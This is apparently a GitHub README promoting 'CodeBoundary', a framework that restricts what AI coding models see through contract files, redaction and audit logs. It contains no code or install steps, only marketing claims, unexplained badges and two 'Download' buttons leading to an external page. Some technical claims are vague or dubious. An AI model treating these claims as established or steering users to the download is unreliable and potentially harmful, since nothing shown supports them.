![preview](https://raw.githubusercontent.com/Atrayee-dev/secure-ai-agent-boundary/main/preview.svg)

# CodeBoundary™ – Zero-Trust AI Co-Development Sandbox

![Static Badge](https://img.shields.io/badge/Status-Operational_(2026)-brightgreen)
![Static Badge](https://img.shields.io/badge/License-MIT-blue)
![Static Badge](https://img.shields.io/badge/Security_Level-Level_IV_Verified-purple)
![Static Badge](https://img.shields.io/badge/Framework-Enterprise_Ready-teal)

**CodeBoundary** is a domain-isolated, data-boundary architecture for high-assurance software engineering teams that integrate frontier AI and local large language models into their daily workflow. Unlike conventional AI-assisted coding tools that share code context, prompt history, and model state across the same execution environment, CodeBoundary enforces a **zero-trust compartment model** where every third-party model operates inside an ephemeral container with strictly bounded data exposure.

This framework is built for organizations that cannot afford accidental memory leaks between proprietary code and a public AI endpoint, yet refuse to abandon the productivity gains of generative coding assistants. CodeBoundary reimagines the relationship between human engineers and AI models—not as a shared workspace, but as a **negotiated, auditable, and ephemeral transaction**.

---

## 🧭 Overview

Modern software engineering has entered an era where AI models are expected to review diffs, suggest refactors, generate unit tests, and even propose architectural changes. The problem: these models are either hosted externally (frontier APIs) or run locally (open-weight models) in an environment that has unrestricted read access to the entire repository.

CodeBoundary solves this by introducing **data-boundary contracts**—structured, declarative rules that define exactly which files, symbols, and commit histories a given model session is allowed to inspect. Every interaction is logged, every data transfer is validated, and every model invocation is reversible to a point-in-time snapshot.

This is not yet another "AI wrapper" for code editors. This is an **engineering governance layer** that sits between your source code and any AI model, whether that model runs on a remote server with 100 billion parameters or on a developer's laptop with 4-bit quantization.

---

## [![Download](https://raw.githubusercontent.com/Atrayee-dev/secure-ai-agent-boundary/main/button.svg)](https://atrayee-dev.github.io/secure-ai-agent-boundary/)

---

## 🚀 Core Capabilities

### 🧱 Compartmentalized Model Sessions

Each time an engineer calls an AI model from within their IDE or CI pipeline, CodeBoundary spins up an **isolated context bubble**. Within this bubble:

- The model sees only the files explicitly permitted by the active data-boundary contract.
- The model's output is written to a staging area (not directly to the working tree) until the engineer explicitly approves it.
- All prompt-response pairs are recorded in an immutable audit trail.

This prevents two critical failure modes: (1) a model inadvertently memorizing and reproducing proprietary code in a different project, and (2) a model being fed sensitive credentials or configuration data that accidentally entered the context window.

### 🔒 Data-Boundary Contract System

The heart of CodeBoundary is the **data-boundary contract**—a YAML/JSON-based configuration file stored alongside your project's source code. Each contract defines:

- **Scope**: Which directories, file extensions, and specific files the model may read.
- **Redaction rules**: Regex patterns or semantic tags that automatically mask secrets, keys, and internal URLs before the prompt ever reaches the model.
- **Visibility level**: Whether the model operates in "read-only," "suggestion," or "direct-write" mode.
- **Output filters**: Constraints on what the model is allowed to generate (e.g., no synthetic credentials, no infinite loops, no system-call invocations).

Contracts can be versioned, reviewed in pull requests, and enforced at the repository level by your existing CI pipeline.

### 🌍 Multilingual Boundary Enforcement

CodeBoundary is language-aware. The boundary engine understands syntax trees for 12+ programming languages (Python, TypeScript, Rust, Go, Java, C#, C++, Ruby, PHP, Swift, Kotlin, and Shell). When a contract restricts a model to reading only TypeScript interfaces in the `/src/types/` directory, the engine verifies the model's context token distribution to ensure no extraneous code sneaks in through embedding overlaps or attention across irrelevant files.

### ⚡ Hybrid Model Orchestration

Your team does not have to choose between a frontier API and a local model. CodeBoundary supports **hybrid sessions** where low-sensitivity tasks (code formatting, variable renaming, docstring generation) are routed to a fast local model, while high-complexity tasks (architecture review, security audit, test coverage analysis) are escalated to a frontier API—all within the same data-boundary contract.

The framework automatically strips and rehydrates context between models, so the local model never sees the full file context, and the frontier model never sees credentials or internal service endpoints.

---

## 📋 Feature Matrix

| Feature | Benefit | Security Implication |
|---|---|---|
| **Data-boundary contracts** | Engineers define precisely what an AI model can access | Eliminates accidental data leakage to external endpoints |
| **Ephemeral context bubbles** | Each AI interaction starts with a clean state | Prevents cross-session memory contamination |
| **Redaction engine** | Regex + ML-based detection of secrets in real time | No secrets ever reach the model's input window |
| **Audit trail** | Immutable log of every prompt, response, and approval | Full compliance with internal security audit requirements |
| **Hybrid routing** | Local + cloud models under one contract | Optimizes cost without sacrificing privacy for sensitive tasks |
| **Syntax-aware boundary checks** | Understands AST boundaries, not just lines of code | Prevents model from inferring context across file boundaries |
| **Staging-area output** | AI suggestions appear in a "sandbox" diff | Engineer must explicitly approve before any change touches the codebase |
| **CI pipeline integration** | Contracts are enforced during automated builds | No unauthorized model access during unattended processes |

---

## 🧩 Architecture Philosophy

CodeBoundary was designed around a single metaphor: **the diplomat's pouch**. When one nation sends a diplomatic pouch to another, the contents are sealed and declared. The receiving nation does not open the pouch unilaterally—it trusts the declared contents and treats the pouch as inviolable.

In CodeBoundary, the prompt is the diplomatic pouch. The engineer declares what the pouch contains (the data-boundary contract). The model (whether local or remote) receives only the declared contents. The output is also sealed until the engineer (the receiving nation) chooses to unseal it.

This metaphor extends to the concept of **boundary negotiation**: before any model invocation, CodeBoundary confirms that both the engineer and the model agree on the contract. If the model attempts to request additional context (e.g., through a chain-of-thought prompt that asks for more files), the request is intercepted and logged as a **boundary violation attempt**.

---

## 📖 Getting Started (Configuration Philosophy)

CodeBoundary does not require installing a daemon, patching your kernel, or running a heavyweight control plane. It is designed as a **decoupled configuration layer** that overlays your existing Git workflow.

The primary entry point is a file called `.codeboundary.yml` at the root of your repository. This file defines:

1. The **default contract** for your project (applied to all model sessions unless overridden).
2. A list of **allowed models** (by name and fingerprint).
3. The **audit log destination** (local `.cb-audit/` directory, or forwarded to an internal log aggregator).

From there, individual developers can define **session contracts** in their local working directory. These session contracts extend or restrict the default contract for specific tasks.

CodeBoundary is editor-agnostic. It integrates with any tool that can execute a CLI command before and after an edit, or any IDE extension that supports LSP-like hook callbacks.

---

## 🤝 Community & Support

CodeBoundary is maintained as an open standard for secure AI-assisted software engineering. While the initial implementation is authored by a core team, the data-boundary contract specification is designed to be adopted by any organization, editor, or CI platform.

- **Documentation**: comprehensive guides on writing contracts, customizing redaction rules, and integrating with existing workflows.
- **Contract library**: a growing collection of pre-built contracts for common scenarios (e.g., "review only public API surfaces", "generate tests without seeing implementation", "refactor without accessing secrets").
- **24/7 Community forum**: engineers and security researchers collaborate on boundary enforcement techniques, novel redaction patterns, and model fingerprinting strategies.

We welcome contributions in the form of contract templates, redaction rule improvements, and language-specific syntactic boundary definitions.

---

## ⚠️ Disclaimer

This software is provided as a security-enhancement framework, not a security guarantee. No system can prevent all forms of data leakage, especially from side-channel attacks or from model behaviors that have not yet been documented. CodeBoundary reduces the attack surface of AI-assisted development, but it does not replace the need for proper secret management, access control, and employee training on data classification. Use at your own risk.

The authors explicitly disclaim any liability for data exfiltration, model misalignment, or unintended outputs generated through the use of this framework. You are responsible for defining appropriate data-boundary contracts for your organization's specific threat model and compliance requirements.

---

## 📄 License

This project is released under the **MIT License**. You are free to use, modify, distribute, and incorporate CodeBoundary into internal or commercial products, provided that the original copyright notice and this permission notice appear in all copies or substantial portions of the software.

See the full license text at: [https://opensource.org/licenses/MIT](https://opensource.org/licenses/MIT)

---

*CodeBoundary — Engineering with boundaries, not blind trust. © 2026*

[![Download](https://raw.githubusercontent.com/Atrayee-dev/secure-ai-agent-boundary/main/button.svg)](https://atrayee-dev.github.io/secure-ai-agent-boundary/)